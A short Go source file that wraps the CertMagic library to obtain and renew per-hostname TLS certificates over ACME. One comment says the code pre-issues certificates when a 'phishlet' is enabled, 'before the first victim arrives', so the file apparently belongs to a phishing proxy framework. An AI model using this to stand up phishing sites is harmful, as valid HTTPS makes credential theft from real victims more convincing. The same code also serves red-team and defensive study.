package cert

import (
	"context"
	"crypto/tls"
	"log/slog"

	"github.com/caddyserver/certmagic"
)

// PerHostACMECertSource issues per-hostname TLS certificates using CertMagic.
// It uses TLS-ALPN-01 by default (no port 80 required). Falls back to HTTP-01
// if TLS-ALPN-01 is unavailable (controlled by the CertMagic config).
//
// CertMagic stores certificates in its own cache directory and handles
// renewal automatically via background goroutines.
type PerHostACMECertSource struct {
	magic  *certmagic.Config
	logger *slog.Logger
}

// NewPerHostACMECertSource constructs the source. email is the ACME contact
// address. storageDir overrides CertMagic's default storage path.
func NewPerHostACMECertSource(email, acmeDir, storageDir string, logger *slog.Logger) *PerHostACMECertSource {
	// CertMagic's API requires configuring the global DefaultACME before
	// calling NewDefault(), which copies the global into the local config.
	// This is safe because we create only one PerHostACMECertSource at startup.
	certmagic.DefaultACME.Email = email
	certmagic.DefaultACME.Agreed = true
	if acmeDir != "" {
		certmagic.DefaultACME.CA = acmeDir
	}

	cfg := certmagic.NewDefault()
	if storageDir != "" {
		cfg.Storage = &certmagic.FileStorage{Path: storageDir}
	}

	return &PerHostACMECertSource{magic: cfg, logger: logger}
}

// GetCertificate returns the certificate for hello.ServerName, issuing one
// via ACME if not already cached by CertMagic.
func (s *PerHostACMECertSource) GetCertificate(hello *tls.ClientHelloInfo) (*tls.Certificate, error) {
	return s.magic.GetCertificate(hello)
}

// ManageAsync tells CertMagic to begin managing a hostname proactively
// (pre-issuing the cert) rather than waiting for the first TLS handshake.
// Call this when a phishlet is enabled so the cert is ready before the first
// victim arrives.
func (s *PerHostACMECertSource) ManageAsync(ctx context.Context, hostnames []string) error {
	return s.magic.ManageAsync(ctx, hostnames)
}
